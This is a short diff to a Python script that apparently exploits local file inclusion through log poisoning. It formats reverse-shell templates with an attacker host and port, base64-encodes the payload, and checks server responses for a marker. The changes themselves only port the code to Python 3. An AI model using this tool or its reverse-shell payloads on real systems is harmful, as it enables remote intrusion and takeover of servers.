@@ -263,7 +263,7 @@ def controll_log(args):
     TEMPLATES[1]=template % (args.lhost,args.lport)
     TEMPLATES[3]=template2 % (args.lhost,args.lport)
     TEMPLATES[2]=""
-    base64revshell=base64.b64encode(TEMPLATES[args.ptype])
+    base64revshell=base64.b64encode(TEMPLATES[args.ptype].encode())
 
     # define the end of lfi request
     if args.reqend != "":
@@ -312,10 +312,10 @@ def controll_log(args):
         found=True
         file_founded=file
         continue
-      debug("Response code: "+str(req.status_code),VERBOSE)
-      debug("Response content: "+req.content,VERBOSE)
+      debug("Response code: "+ str(req.status_code),VERBOSE)
+      debug("Response content: "+ str(req.content),VERBOSE)
       d=req.content
-      if d.find(TAG) != -1:
+      if d.find(TAG.encode()) != -1:
         found=True
         file_founded=file
         break
